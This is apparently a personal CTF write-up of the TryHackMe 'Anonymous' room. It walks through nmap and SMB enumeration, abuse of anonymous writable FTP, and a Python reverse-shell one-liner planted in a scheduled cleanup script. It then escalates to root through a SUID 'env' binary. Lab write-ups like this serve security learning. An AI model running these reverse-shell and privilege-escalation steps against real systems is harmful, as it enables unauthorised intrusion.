---
title: "Anonymous - TryHackMe"
date: 2026-08-29 10:10:10 +0545

image:
  path: /assets/img/posts_thumbnails/anonymous.png
  alt: "anonymous TryHackMe"

description: Minor misconfigurations—such as anonymous FTP access and excessive group privileges—can chained together leads to higher privileges were the coverings of this Anonymous room.

categories: [Web, Linux]
tags: [web, linux, nmap, smbclient, netcat, GTFOBins]

level: Medium
platform: TryHackMe
series: "Web Exploitation"  
  
room: "Anonymous"
type: "CTF Write-up"
status: Completed 
---

## Overview:

`Anonymous` is a medium-difficulty Linux penetration-testing room focused on enumeration, service exploitation, and privilege escalation. The attack path begins with FTP enumeration, where anonymous access and a writable scripts directory provide an initial foothold. After gaining access as the `namelessone` user, further enumeration reveals interesting group memberships, including `LXD` and `SUID` binaries, which can be investigated as a potential privilege-escalation vector.

---

## Recon:

``` bash
nmap -sC -sV -p- -T4 -oN /home/kali/Desktop/THM_LAB/rooms/medium/anonymous/nmap_scan.txt <target-ip>
```
The scan revealed four open ports:

- **21** (FTP)
- **22** (SSH)
- **139** (netbios-ssn)
- **445** (microsoft-ds)

![nmap](/assets/images/writeups/anonymous/1.png)

I decided to analyze the output of nmap maybe so that i might be lucky and find an exploitable service.

1. I did a searchsploit on the ftp got nothing special over there. 
2. I got a really sensitive information that can help me to exploit the box . I found that anonymous ftp login is allowed. Just by using the username `anonymous` and the password doesn’t matter and i just hit enter and was able to log into the box also the ftp was writable this is what i got from nmap output.

---

## Enumeration

There wa NetBios/smb running so i tried to figure what shares are present where i got the answer of this question `There's a share on the user's computer.  What's it called?`.

```bash
smbclient <target-ip> -U <username>
```
![smb](/assets/images/writeups/anonymous/2.png)

There was open ports on port 21 where `FTP` service was running and allows `anonymous` user Login. So let's check out that.

```bash
ftp <target-ip>
```
i had successfully logged in through FTP. Checking the directories with `ls` command there i saw `scripts` directory with `read/write/execute` permissions and found three files in the scripts folder, 

![folder](/assets/images/writeups/anonymous/3.png)

i downloaded them and reviewed their contents where i found the way to enter the system. 

![content](/assets/images/writeups/anonymous/4.png)

---

## Exploitation: Shell as namelessone

Looking at the script it's clear that it's a simple log cleaning `bash script`, and looks like a cleanup script that deletes the files present in the `tmp` directory. and the `removed_files.log` file is a log file that shows the deleted files from the `tmp` directory.

So, i was sure at that moment that this script is probably automatically ran by the server and i embedded a reverse shell inside of the script and uploaded it to the server and amazing I got a reverse shell where i got my first flag too. 

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<target-ip>",<port>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```
![folder](/assets/images/writeups/anonymous/5.png)

---

## Privilege Escalation: Shell as root

I tried running `sudo -l` but password was required which was not available till this time. and i tried to see user groups using `id` i found `lxd` which could lead me towards privilege escalation but i did further more enumeration. So tried to identify binaries with `SUID` bit set so that may use it to do privilege escalation to root.

```bash
find / -type f -perm /4000 2>/dev/null
```
![folder](/assets/images/writeups/anonymous/6.png)

i had got the list of `SUID` files.

![folder](/assets/images/writeups/anonymous/7.png)

I did check on the [GTFObins](https://gtfobins.org/) website and after going through the list of identified binaries the only option that worked was `env` which then i exploited to bypass local security restrictions and got my root flag too.

```bash
/usr/bin/env /bin/sh
```
![folder](/assets/images/writeups/anonymous/8.png)

---

## Tools
 - nmap
 - smbclient
 - netcat
  
🖼️ **all process screenshot:** ![all process](/assets/images/writeups/anonymous/all_process.png)


*Thanks for reading!*

















